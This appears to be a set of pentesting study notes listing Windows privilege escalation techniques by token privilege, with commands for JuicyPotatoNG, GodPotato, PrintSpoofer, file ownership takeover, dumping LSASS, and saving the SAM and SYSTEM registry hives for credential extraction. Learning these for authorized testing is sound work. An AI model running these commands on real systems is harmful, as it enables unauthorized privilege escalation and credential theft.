# Enumeration 
```
whoami /priv
```
# SeDebugPrivilege 
- What it does: Grants users critical access to system components and can be utilized for remote command execution 
Grants user critical access to operating system components and can be utilized for remote code execution 
- Utilizes LSASS 
- Steps include running  lsass.exe on command line 
- Through task manager, dumping the file 
- Uploading file to host and extracting credentials 

# SeTakeOwnership
What it does: Lets you take ownership of certain files 

```
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
```
# SeImpersonatePrivilege
What it does: Lets you impersonate system user 
## Common tools: 
### JuicypotatoNG

```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```
### God Potato 
- Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
- Grab the binary that matches the installed runtime (e.g., GodPotato-NET4.exe on modern Server 2022).
- If your initial execution primitive is a webshell/UI with short timeouts, stage the payload as a script and ask GodPotato to run it instead of a long inline command

```
GodPotato -cmd "cmd /c whoami"
```


### PrintSpoofer

```
.\PrintSpoofer.exe -i -c cmd
```

# SeLoadDriverPrivilege
```
wget https://github.com/JoshMorrison99/SeLoadDriverPrivilege # read instructions and transfer to target machine 
```

# SeBackupPrivilege

- Can abuse backup privileges and transfer to host system 
```
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```
